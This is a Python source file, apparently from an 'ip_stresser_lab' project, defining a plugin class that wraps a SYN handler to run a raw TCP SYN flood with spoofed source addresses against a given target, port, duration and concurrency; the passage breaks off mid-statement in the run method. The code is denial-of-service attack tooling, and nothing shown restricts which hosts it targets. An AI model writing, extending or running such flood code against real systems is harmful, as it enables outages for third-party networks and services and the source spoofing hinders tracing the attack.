"""SYN flood extension — wraps SynHandler inside the plugin contract."""
from __future__ import annotations

from typing import Any

from ip_stresser_lab.contracts.stress_contract import StressContract, StressResult
from ip_stresser_lab.core.dispatcher import run_workers
from ip_stresser_lab.handlers.syn_handler import SynHandler


class SynFloodExtension(StressContract):
    method = "syn"
    description = "Raw TCP SYN flood with spoofed source addresses."
    version = "0.3.1"

    def __init__(self) -> None:
        self._handler = SynHandler()
        self._cfg: dict[str, Any] = {}

    async def prepare(self, config: dict[str, Any]) -> None:
        self._cfg = config.get("syn", {})
        self._handler.open()

    async def run(self, *, target: str, port: int, duration: int, concurrency: int) -> StressResult:
        pps_cap = self._cfg.get("pps_cap") or None
        result = await run_workers